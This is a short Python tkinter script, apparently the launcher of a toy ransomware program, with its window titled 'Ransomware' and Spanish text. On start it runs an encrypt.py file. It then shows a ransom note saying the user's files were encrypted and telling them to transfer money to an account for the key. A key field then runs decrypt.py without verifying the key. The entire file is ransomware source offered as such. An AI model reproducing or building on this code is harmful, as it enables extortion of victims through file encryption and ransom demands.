from tkinter import *
from tkinter import ttk
import encrypt
import decrypt



def verify_key():
  key = entry.get()
  #print(key)
  #key.set(key_input)
  exec(open('decrypt.py').read())
  label4=Label(win, text="Se desencriptaron los archivos", font=("Courier 14 bold")).pack(pady=5)
  
  
  
if __name__ == '__main__':
  exec(open('encrypt.py').read())
  
  win = Tk()
  win.geometry("450x300")
  win.title("Ransomware")
  
  
  label=Label(win, text="Sus archivos fueron encriptados", font=("Courier 14 bold")).pack(pady=10)
  label2=Label(win, text="Transfiera a la cuenta ... para obtener \nla clave para desencriptarlos", font=("Courier 12 bold")).pack(pady=5)
  label3=Label(win, text="Ingrese la clave", font=("Courier 14 bold")).pack(pady=5)

  # Input del usuario
  entry= Entry(win, width= 60)
  entry.focus_set()
  entry.pack(padx = 10, pady=10)
  
   
  ttk.Button(win, text="Aceptar",width=20, command=verify_key).pack(pady=20)
  
  win.mainloop()  
  
  
